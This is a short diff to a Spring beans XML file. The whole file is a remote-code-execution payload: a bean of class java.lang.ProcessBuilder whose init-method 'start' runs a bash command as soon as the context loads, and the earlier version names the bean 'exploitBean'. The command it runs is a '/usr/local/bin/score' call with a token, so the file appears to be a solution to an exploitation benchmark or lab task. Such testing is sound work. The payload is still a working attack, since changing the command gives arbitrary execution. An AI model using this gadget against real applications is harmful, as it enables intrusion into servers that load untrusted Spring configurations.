@@ -1,11 +1,16 @@
-<beans>
-    <bean id="exploitBean" class="java.lang.ProcessBuilder" init-method="start">
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xmlns:p="http://www.springframework.org/schema/p"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+        http://www.springframework.org/schema/beans/spring-beans.xsd">
+
+   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
         <constructor-arg>
-            <list>
+          <list>
                 <value>bash</value>
                 <value>-c</value>
                 <value>/usr/local/bin/score 2312c18e-9d65-4a4a-bcd9-aaf62c65d95d</value>
-            </list>
+          </list>
         </constructor-arg>
     </bean>
 </beans>
